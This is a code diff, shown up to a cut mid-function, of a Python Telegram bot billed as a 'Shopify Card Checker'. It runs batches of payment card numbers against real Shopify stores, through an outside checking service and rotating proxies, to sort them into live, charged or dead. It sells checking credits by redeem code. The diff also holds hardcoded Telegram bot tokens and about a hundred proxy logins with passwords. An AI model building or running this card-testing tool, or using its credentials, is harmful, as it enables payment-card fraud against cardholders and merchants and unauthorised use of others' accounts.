@@ -1,637 +1,417 @@
-import os
-import json
-import logging
-import random
-import string
 import re
-import requests
 import time
-from datetime import datetime, timedelta
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import threading
+import random
+import urllib.parse
+import requests
+import telebot
+from typing import List
 
-# ============== CONFIGURATION ==============
-BOT_TOKEN = "8854554558:AAEiuvp-nKrlrI2Hfhz6gmo8WQ8jaNq9d1s"
-OWNER_ID = 8570832903
-API_URL = "https://nik.cards/shopify"
-DEFAULT_PROXY = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
-SITE = "https://aha-wrap.myshopify.com/"
-FREE_SINGLE_LIMIT = 131
-FREE_BULK_LIMIT = 1000
+# ===================== CONFIG =====================
+BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"
 
-# ============== DATABASE ==============
-class Database:
-    def __init__(self):
-        self.db_file = "database.json"
-        self.history_file = "history.json"
-        self.reports_file = "reports.csv"
-        self._init_files()
-        self.data = self._load_data()
+shop_urls = [
+    "https://52a07b-2.myshopify.com",
+    "https://6sbibg-yh.myshopify.com",
+    "https://7pxptt-gn.myshopify.com",
+    "https://7zzbrn-ch.myshopify.com",
+    "https://a5qrze-bz.myshopify.com",
+    "https://ajs-55743.myshopify.com",
+    "https://ajvv.myshopify.com",
+    "https://ak24pz-na.myshopify.com",
+    "https://al-furqans-perfumes-and-beauty.myshopify.com",
+    "https://allthingsbykeisha.myshopify.com",
+    "https://amneue.myshopify.com",
+    "https://animolds.myshopify.com",
+    "https://anjoly30-boutique.myshopify.com",
+    "https://antarctic-press.myshopify.com",
+    "https://apexmarket-store.myshopify.com",
+    "https://apkbridal.myshopify.com",
+    "https://boldwritst-store.myshopify.com",
+    "https://brand-x-electrical.myshopify.com",
+    "https://brandalees-bargains.myshopify.com",
+    "https://burlap-kitchen.myshopify.com",
+]
 
-    def _init_files(self):
-        if not os.path.exists(self.db_file):
-            with open(self.db_file, 'w') as f:
-                json.dump({"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}, f, indent=4)
-        if not os.path.exists(self.history_file):
-            with open(self.history_file, 'w') as f:
-                json.dump([], f, indent=4)
-        if not os.path.exists(self.reports_file):
-            with open(self.reports_file, 'w') as f:
-                f.write("Timestamp,User_ID,Username,Card,Status,Charge,Proxy,Type\n")
-        if not os.path.exists("logs"):
-            os.makedirs("logs")
+# ===================== PROXY CONFIG (ONLY FRESH mk PROXIES) =====================
+proxy_list = [
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.53:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.61.81:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.53.138:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.56.122:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.11.55:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.254.103:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.47.157:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.7.40:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.236.79:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.119:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.24.176:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.41:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.6.30:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.49.115:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.182:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.44.86:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.33.153:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.128:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.210:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.191.46:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.247.90:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.42.165:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.42.229:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.36.62:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.81:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.51.18:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.238.156:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.231.207:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.44.236:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.235.64:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.49.160:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.190:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.26.92:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.194:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.51.100:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.237.252:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.30.133:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.235.140:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.20.122:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.2.57:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.35.3:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.118:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.47.34:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.50.94:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.236.42:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.3.219:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.167.19.47:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.46:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.43.81:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.20.160:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@193.56.28.129:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.179.180:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.246.4:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.232.64:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.27.154:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.40.176:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.225.210:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.38.196:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.239.30:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.63.59:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.58.225:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.37.104:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.190.145:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.240.149:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.59.44:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.253.56:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.42.128:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.36.225:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.178.73:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.30.50:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.53.40:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.253.22:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.34.36:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.185.241:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.62.142:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.51.81:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.10.240:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.66:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.71:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.50.182:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.31.128:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.27.180:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.2.71:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.34.50:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@217.181.92.45:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.12.207:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.7.123:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@217.181.90.94:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.161.174:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.166.223:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.32.173:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.176:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.234.112:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.72:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.40.24:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.42.114:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.177.66:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.68:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.0.98:3129",
+    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.181.80:3129"
+]
 
-    def _load_data(self):
-        try:
-            with open(self.db_file, 'r') as f:
-                return json.load(f)
-        except:
-            return {"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}
+bot = telebot.TeleBot(BOT_TOKEN)
+user_check_in_progress = {}
+last_check_time = {}
 
-    def _save_data(self):
-        with open(self.db_file, 'w') as f:
-            json.dump(self.data, f, indent=4)
-
-    def _save_history(self, entry):
-        try:
-            with open(self.history_file, 'r') as f:
-                history = json.load(f)
-        except:
-            history = []
-        history.append(entry)
-        with open(self.history_file, 'w') as f:
-            json.dump(history, f, indent=4)
-
-    def _save_report(self, user_id, username, card, status, charge, proxy, check_type):
-        with open(self.reports_file, 'a') as f:
-            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{user_id},{username},{card},{status},{charge},{proxy},{check_type}\n")
-
-    def get_user(self, user_id):
-        return self.data["users"].get(str(user_id))
-
-    def create_user(self, user_id, username, first_name, last_name):
-        uid = str(user_id)
-        if uid not in self.data["users"]:
-            self.data["users"][uid] = {
-                "user_id": uid,
-                "username": username or "Unknown",
-                "first_name": first_name or "Unknown",
-                "last_name": last_name or "",
-                "plan": "free",
-                "expiry_date": None,
-                "credits": FREE_SINGLE_LIMIT,
-                "joined_date": datetime.now().isoformat(),
-                "total_checks": 0,
-                "proxies": [],
-                "active_proxy": None
-            }
-            self.data["stats"]["total_users"] += 1
-            self._save_data()
-            return True
+# ===================== UTILITY FUNCTIONS =====================
+def is_valid_card(card: str) -> bool:
+    parts = card.split('|')
+    if len(parts) != 4:
         return False
-
-    def update_user_plan(self, user_id, plan, duration):
-        uid = str(user_id)
-        if uid in self.data["users"]:
-            expiry = None if duration == 'lifetime' else (datetime.now() + timedelta(days=int(duration.replace('d', '')))).isoformat() if duration != 'lifetime' else 'lifetime'
-            self.data["users"][uid]["plan"] = plan
-            self.data["users"][uid]["expiry_date"] = expiry
-            self._save_data()
-
-    def add_credits(self, user_id, credits):
-        uid = str(user_id)
-        if uid in self.data["users"]:
-            self.data["users"][uid]["credits"] += credits
-            self._save_data()
-
-    def deduct_credits(self, user_id, amount):
-        uid = str(user_id)
-        if uid in self.data["users"]:
-            self.data["users"][uid]["credits"] -= amount
-            self._save_data()
-
-    def get_user_credits(self, user_id):
-        user = self.get_user(user_id)
-        return user["credits"] if user else 0
-
-    def get_user_plan(self, user_id):
-        user = self.get_user(user_id)
-        return (user["plan"], user["expiry_date"]) if user else None
-
-    def increment_checks(self, user_id):
-        uid = str(user_id)
-        if uid in self.data["users"]:
-            self.data["users"][uid]["total_checks"] += 1
-            self.data["stats"]["total_checks"] += 1
-            self._save_data()
-
-    def add_proxy(self, user_id, proxy):
-        uid = str(user_id)
-        if uid in self.data["users"]:
-            if proxy not in self.data["users"][uid]["proxies"]:
-                self.data["users"][uid]["proxies"].append(proxy)
-                if not self.data["users"][uid]["active_proxy"]:
-                    self.data["users"][uid]["active_proxy"] = proxy
-                self._save_data()
-                return True
+    cc, mm, yy, cvv = parts
+    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
         return False
-
-    def remove_proxy(self, user_id, proxy):
-        uid = str(user_id)
-        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
-            self.data["users"][uid]["proxies"].remove(proxy)
-            if self.data["users"][uid]["active_proxy"] == proxy:
-                self.data["users"][uid]["active_proxy"] = self.data["users"][uid]["proxies"][0] if self.data["users"][uid]["proxies"] else None
-            self._save_data()
-            return True
+    if not mm.isdigit() or len(mm) != 2:
         return False
-
-    def set_active_proxy(self, user_id, proxy):
-        uid = str(user_id)
-        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
-            self.data["users"][uid]["active_proxy"] = proxy
-            self._save_data()
-            return True
+    if not yy.isdigit() or len(yy) not in [2, 4]:
         return False
-
-    def get_user_proxies(self, user_id):
-        user = self.get_user(user_id)
-        return user.get("proxies", []) if user else []
-
-    def get_active_proxy(self, user_id):
-        user = self.get_user(user_id)
-        return user.get("active_proxy") if user else None
-
-    def create_redeem_code(self, code, credits, duration, created_by):
-        self.data["redeem_codes"][code] = {
-            "code": code,
-            "credits": credits,
-            "duration": duration,
-            "created_by": str(created_by),
-            "created_date": datetime.now().isoformat(),
-            "used_by": None,
-            "used_date": None,
-            "is_used": False
-        }
-        self._save_data()
-        return True
-
-    def use_redeem_code(self, code, user_id):
-        if code in self.data["redeem_codes"] and not self.data["redeem_codes"][code]["is_used"]:
-            self.data["redeem_codes"][code]["used_by"] = str(user_id)
-            self.data["redeem_codes"][code]["used_date"] = datetime.now().isoformat()
-            self.data["redeem_codes"][code]["is_used"] = True
-            self.data["stats"]["total_redeems"] += 1
-            self._save_data()
-            return True
+    if not cvv.isdigit() or len(cvv) not in [3, 4]:
         return False
+    return True
 
-    def get_redeem_code(self, code):
-        return self.data["redeem_codes"].get(code)
+def esc(t):
+    return str(t).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
 
-    def add_check_history(self, user_id, card, status, charge, proxy, is_bulk=0):
-        entry = {
-            "user_id": str(user_id),
-            "card_number": card,
-            "status": status,
-            "charge_amount": charge,
-            "proxy": proxy,
-            "checked_date": datetime.now().isoformat(),
-            "is_bulk": is_bulk
-        }
-        self._save_history(entry)
-        self.increment_checks(user_id)
-        user = self.get_user(user_id)
-        username = user["username"] if user else "Unknown"
-        self._save_report(user_id, username, card, status, charge, proxy, "Bulk" if is_bulk else "Single")
-
-    def get_check_count(self, user_id, is_bulk=0):
-        try:
-            with open(self.history_file, 'r') as f:
-                history = json.load(f)
-        except:
-            return 0
-        today = datetime.now().date()
-        count = 0
-        for entry in history:
-            if entry["user_id"] == str(user_id) and entry["is_bulk"] == is_bulk:
-                if datetime.fromisoformat(entry["checked_date"]).date() == today:
-                    count += 1
-        return count
-
-    def get_user_stats(self, user_id):
-        user = self.get_user(user_id)
-        if not user:
-            return None
-        try:
-            with open(self.history_file, 'r') as f:
-                history = json.load(f)
-        except:
-            history = []
-        total = live = dead = unknown = charge = 0
-        for entry in history:
-            if entry["user_id"] == str(user_id):
-                total += 1
-                s = entry["status"]
-                if s == "Live": live += 1
-                elif s == "Charge": charge += 1
-                elif s == "Dead": dead += 1
-                else: unknown += 1
-        return {"total_checks": total, "live": live, "dead": dead, "unknown": unknown, "charge": charge}
-
-# ============== CARD CHECKER ==============
-class CardChecker:
-    def __init__(self):
-        self.api_url = API_URL
-        self.site = SITE
-
-    def check_card(self, card_number, proxy_string=None):
-        proxy_to_use = proxy_string if proxy_string else DEFAULT_PROXY
-        try:
-            parts = proxy_to_use.split(':')
-            proxies = None
-            if len(parts) == 4:
-                host, port, user, passwd = parts
-                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
-                proxies = {"http": proxy_url, "https": proxy_url}
-            params = {'site': self.site, 'cc': card_number, 'proxy': proxy_to_use}
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'application/json'
-            }
-            resp = requests.get(self.api_url, params=params, proxies=proxies, headers=headers, timeout=30)
-            data = resp.json()
-            if 'status' in data:
-                status = data['status'].lower()
-                charge = data.get('charge', '0.00')
-                if status in ('live', 'success'):
-                    return ('Live', charge, data, proxy_to_use)
-                elif status in ('charge', 'charged'):
-                    return ('Charge', charge, data, proxy_to_use)
-                elif status in ('dead', 'failed', 'error'):
-                    return ('Dead', '0.00', data, proxy_to_use)
-                else:
-                    return ('Unknown', '0.00', data, proxy_to_use)
-            else:
-                return ('Unknown', '0.00', data, proxy_to_use)
-        except Exception as e:
-            return ('Unknown', '0.00', {'error': str(e)}, proxy_to_use)
-
-# ============== HELPERS ==============
-def validate_card(card):
-    card = re.sub(r'\s+', '', card)
-    if not card.isdigit() or len(card) < 13 or len(card) > 19:
-        return False
-    total = 0
-    for i, d in enumerate(reversed(card)):
-        n = int(d)
-        if i % 2 == 1:
-            n *= 2
-            if n > 9:
-                n -= 9
-        total += n
-    return total % 10 == 0
-
-def format_card(card):
-    return f"{card[:4]}****{card[-4:]}" if len(card) >= 16 else card
-
-def parse_file_content(content):
-    return [line.strip() for line in content.split('\n') if line.strip() and validate_card(line.strip())]
-
-def validate_proxy(proxy):
-    parts = proxy.split(':')
-    return len(parts) == 4 and parts[0] and parts[1].isdigit() and parts[2] and parts[3]
-
-class RedeemCodeManager:
-    @staticmethod
-    def generate_code(length=12):
-        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
-
-# ============== BOT HANDLERS ==============
-db = Database()
-checker = CardChecker()
-code_manager = RedeemCodeManager()
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    db.create_user(user.id, user.username, user.first_name, user.last_name)
-    await update.message.reply_text(
-        f"🎯 Welcome to Shopify Card Checker Bot!\n\n"
-        f"Hi {user.first_name}! Use /help for commands.",
-        parse_mode='Markdown'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        f"📚 Commands:\n"
-        f"/sh <card> – single check\n"
-        f"/msh <card1|card2> – multiple\n"
-        f"/chk – reply to .txt file\n"
-        f"/proxy – manage proxies\n"
-        f"/redeem <code> – redeem premium\n"
-        f"/plan – your plan & credits\n"
-        f"/stats – your stats\n"
-        f"/buy – premium plans\n"
-        f"/get_red <credits> <duration> – owner only\n\n"
-        f"Proxy format: host:port:user:pass",
-        parse_mode='Markdown'
-    )
-
-async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not context.args:
-        await update.message.reply_text("Usage: /sh <card>")
-        return
-    card = context.args[0].strip()
-    if not validate_card(card):
-        await update.message.reply_text("Invalid card number.")
-        return
-    user_plan = db.get_user_plan(user_id)
-    is_premium = user_plan and user_plan[0] != 'free'
-    if not is_premium and db.get_user_credits(user_id) <= 0:
-        await update.message.reply_text("No credits. Buy premium with /buy.")
-        return
-    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
-    if not is_premium:
-        db.deduct_credits(user_id, 1)
-    msg = await update.message.reply_text("Checking...")
-    status, charge, data, used_proxy = checker.check_card(card, proxy)
-    db.add_check_history(user_id, card, status, charge, used_proxy)
-    emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
-    reply = f"💳 Shopify Result\n\nCard: `{format_card(card)}`\nStatus: {emoji} *{status}*\n"
-    if status == "Charge":
-        reply += f"Amount: *${charge}*\n"
-    reply += f"Proxy: `{used_proxy[:30]}...`\n"
-    if not is_premium:
-        reply += f"\nRemaining credits: {db.get_user_credits(user_id)}"
-    await msg.edit_text(reply, parse_mode='Markdown')
-
-async def multi_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not context.args:
-        await update.message.reply_text("Usage: /msh <card1|card2|...>")
-        return
-    cards = [c.strip() for c in context.args[0].split('|') if c.strip() and validate_card(c.strip())]
-    if not cards:
-        await update.message.reply_text("No valid cards.")
-        return
-    user_plan = db.get_user_plan(user_id)
-    is_premium = user_plan and user_plan[0] != 'free'
-    if not is_premium:
-        if db.get_user_credits(user_id) <= 0:
-            await update.message.reply_text("No credits.")
-            return
-        daily = db.get_check_count(user_id)
-        if daily >= FREE_SINGLE_LIMIT:
-            await update.message.reply_text(f"Daily free limit ({FREE_SINGLE_LIMIT}) reached.")
-            return
-        limit = min(len(cards), db.get_user_credits(user_id), FREE_SINGLE_LIMIT - daily)
-        cards = cards[:limit]
-    if not cards:
-        await update.message.reply_text("No cards to check.")
-        return
-    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
-    msg = await update.message.reply_text(f"Checking {len(cards)} cards...")
-    results = []
-    for i, card in enumerate(cards):
-        status, charge, data, used_proxy = checker.check_card(card, proxy)
-        db.add_check_history(user_id, card, status, charge, used_proxy)
-        if not is_premium:
-            db.deduct_credits(user_id, 1)
-        results.append((card, status, charge))
-        if (i+1) % 5 == 0:
-            await msg.edit_text(f"Progress: {i+1}/{len(cards)}")
-    reply = f"📊 Results ({len(results)} cards)\nProxy: `{proxy[:30]}...`\n\n"
-    live = charge = dead = unknown = 0
-    for card, status, amt in results:
-        emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
-        reply += f"{emoji} `{format_card(card)}` → *{status}*"
-        if status in ("Live","Charge"):
-            reply += f" (${amt})"
-        reply += "\n"
-        if status == "Live": live += 1
-        elif status == "Charge": charge += 1
-        elif status == "Dead": dead += 1
-        else: unknown += 1
-    summary = f"\n✅ Live: {live}  💰 Charge: {charge}  ❌ Dead: {dead}  ❓ Unknown: {unknown}"
-    if not is_premium:
-        summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
-    await msg.edit_text(reply + summary, parse_mode='Markdown')
-
-async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
-        await update.message.reply_text("Please send a .txt file.")
-        return
-    user_plan = db.get_user_plan(user_id)
-    is_premium = user_plan and user_plan[0] != 'free'
-    if not is_premium:
-        if db.get_user_credits(user_id) <= 0:
-            await update.message.reply_text("No credits.")
-            return
-        limit = FREE_BULK_LIMIT
-    else:
-        limit = float('inf')
-    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
-    msg = await update.message.reply_text("Downloading file...")
+def bin_lookup(bin_code):
     try:
-        file = await update.message.document.get_file()
-        content = (await file.download_as_bytearray()).decode('utf-8')
-        cards = parse_file_content(content)
-        if not cards:
-            await msg.edit_text("No valid cards found.")
-            return
-        cards_to_check = cards[:limit] if limit != float('inf') else cards
-        await msg.edit_text(f"Checking {len(cards_to_check)} cards...")
-        results = []
-        for i, card in enumerate(cards_to_check):
-            status, charge, data, used_proxy = checker.check_card(card, proxy)
-            db.add_check_history(user_id, card, status, charge, used_proxy, is_bulk=1)
-            if not is_premium:
-                db.deduct_credits(user_id, 1)
-            results.append((card, status, charge))
-            if (i+1) % 10 == 0:
-                await msg.edit_text(f"Progress: {i+1}/{len(cards_to_check)}")
-        # Build report safely
-        report_lines = []
-        report_lines.append("Shopify Card Validation Report")
-        report_lines.append("=" * 50)
-        report_lines.append(f"Gateway: {SITE}")
-        report_lines.append(f"Proxy: {proxy}")
-        report_lines.append("=" * 50)
-        report_lines.append("")
-        live = charge = dead = unknown = 0
-        for card, status, amt in results:
-            line = f"Card: {card} | Status: {status}"
-            if status in ("Live","Charge"):
-                line += f" | Charge: ${amt}"
-            report_lines.append(line)
-            if status == "Live": live += 1
-            elif status == "Charge": charge += 1
-            elif status == "Dead": dead += 1
-            else: unknown += 1
-        report_lines.append("")
-        report_lines.append(f"Summary: Live: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}")
-        if not is_premium:
-            report_lines.append(f"Remaining credits: {db.get_user_credits(user_id)}")
-        report_content = "\n".join(report_lines)
-        filename = f"report_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        with open(filename, 'w') as f:
-            f.write(report_content)
-        with open(filename, 'rb') as f:
-            await update.message.reply_document(document=f, filename=filename, caption="Report ready.")
-        os.remove(filename)
-        summary = f"✅ Done! {len(results)} cards checked.\nLive: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}"
-        if not is_premium:
-            summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
-        await msg.edit_text(summary)
-    except Exception as e:
-        await msg.edit_text(f"Error: {str(e)}")
-
-async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not context.args:
-        proxies = db.get_user_proxies(user_id)
-        active = db.get_active_proxy(user_id)
-        text = f"🌐 Proxy Management\nTotal: {len(proxies)}\nActive: {active if active else 'Default'}\n\nCommands:\n/proxy add host:port:user:pass\n/proxy list\n/proxy set host:port:user:pass\n/proxy remove host:port:user:pass\n/proxy active\n/proxy default"
-        await update.message.reply_text(text, parse_mode='Markdown')
-        return
-    action = context.args[0].lower()
-    if action == "add" and len(context.args) == 2:
-        proxy = context.args[1]
-        if not validate_proxy(proxy):
-            await update.message.reply_text("Invalid format. Use host:port:user:pass")
-            return
-        if db.add_proxy(user_id, proxy):
-            await update.message.reply_text(f"Proxy added: {proxy}")
-        else:
-            await update.message.reply_text("Proxy already exists.")
-    elif action == "list":
-        proxies = db.get_user_proxies(user_id)
-        active = db.get_active_proxy(user_id)
-        if not proxies:
-            await update.message.reply_text("No proxies saved.")
-            return
-        text = "📋 Your proxies:\n"
-        for i, p in enumerate(proxies, 1):
-            text += f"{'👉 ' if p == active else '   '}{i}. {p}\n"
-        await update.message.reply_text(text)
-    elif action == "set" and len(context.args) == 2:
-        proxy = context.args[1]
-        if db.set_active_proxy(user_id, proxy):
-            await update.message.reply_text(f"Active proxy set to: {proxy}")
-        else:
-            await update.message.reply_text("Proxy not found.")
-    elif action == "remove" and len(context.args) == 2:
-        proxy = context.args[1]
-        if db.remove_proxy(user_id, proxy):
-            await update.message.reply_text(f"Proxy removed: {proxy}")
-        else:
-            await update.message.reply_text("Proxy not found.")
-    elif action == "active":
-        active = db.get_active_proxy(user_id) or "Default"
-        await update.message.reply_text(f"Active proxy: {active}")
-    elif action == "default":
-        if db.set_active_proxy(user_id, DEFAULT_PROXY):
-            await update.message.reply_text("Switched to default proxy.")
-        else:
-            await update.message.reply_text("Could not set default.")
-    else:
-        await update.message.reply_text("Unknown proxy command.")
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not context.args:
-        await update.message.reply_text("Usage: /redeem <code>")
-        return
-    code = context.args[0].upper()
-    data = db.get_redeem_code(code)
-    if not data:
-        await update.message.reply_text("Invalid code.")
-        return
-    if data["is_used"]:
-        await update.message.reply_text("Code already used.")
-        return
-    credits = data["credits"]
-    duration = data["duration"]
-    db.update_user_plan(user_id, 'premium', duration)
-    db.add_credits(user_id, credits)
-    db.use_redeem_code(code, user_id)
-    await update.message.reply_text(f"✅ Redeemed! +{credits} credits, premium until {db.get_user_plan(user_id)[1]}")
-
-async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    plan = db.get_user_plan(user_id)
-    credits = db.get_user_credits(user_id)
-    proxies = db.get_user_proxies(user_id)
-    active = db.get_active_proxy(user_id) or "Default"
-    text = f"📊 Your Plan\nPlan: {plan[0].upper() if plan else 'Free'}\nExpiry: {plan[1] if plan and plan[1] else 'N/A'}\nCredits: {credits}\nProxies: {len(proxies)}\nActive proxy: {active}"
-    await update.message.reply_text(text)
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if context.args and context.args[0] == 'all' and user_id == OWNER_ID:
-        stats = db.data["stats"]
